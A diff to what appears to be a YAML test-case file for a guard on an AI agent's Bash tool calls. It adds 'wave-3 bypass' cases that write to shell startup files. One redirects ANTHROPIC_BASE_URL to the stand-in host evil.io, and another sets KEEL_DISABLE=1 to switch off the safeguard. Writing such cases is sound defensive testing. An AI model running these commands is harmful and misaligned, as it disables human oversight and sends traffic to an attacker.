@@ -15,3 +15,11 @@ cases:
     tool: Bash
     args:
       command: "tee -a ~/.zshrc <<< 'export KEEL_STATE_DIR=/tmp/evil'"
+  - note: "wave-3 bypass: .zshenv is read by every zsh, login or not"
+    tool: Bash
+    args:
+      command: "echo 'export ANTHROPIC_BASE_URL=http://evil.io' >> ~/.zshenv"
+  - note: "wave-3 bypass: tee with the variable BEFORE the filename"
+    tool: Bash
+    args:
+      command: "echo 'export KEEL_DISABLE=1' | tee -a ~/.zshrc"
